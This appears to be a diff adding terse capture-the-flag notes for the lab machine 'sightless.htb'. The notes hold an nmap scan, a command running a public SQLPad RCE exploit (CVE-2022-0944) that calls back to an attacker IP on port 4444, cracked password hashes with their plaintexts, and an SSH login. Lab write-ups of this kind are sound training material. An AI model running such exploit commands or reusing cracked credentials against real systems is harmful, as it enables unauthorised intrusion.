@@ -1,0 +1,31 @@
+Not shown: 65522 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE    VERSION
+21/tcp    open     ftp        ProFTPD (requires SSL)
+22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c96e3b8fc6032905e5a0ca0090c95c52 (ECDSA)
+|_  256 9bde3a27773b1be1195f1611be70e056 (ED25519)
+80/tcp    open     http       nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://sightless.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+2531/tcp  filtered ito-e-gui
+3793/tcp  filtered dcsoftware
+4894/tcp  filtered lyskom
+18968/tcp filtered unknown
+20005/tcp filtered btx
+35107/tcp filtered unknown
+42859/tcp filtered unknown
+43301/tcp filtered unknown
+44598/tcp filtered unknown
+45023/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944
+python3 exploit\(5\).py http://sqlpad.sightless.htb 10.10.14.6 4444
+
+$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
+$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
+
+ssh 10.10.11.32 -l michael 
+
+
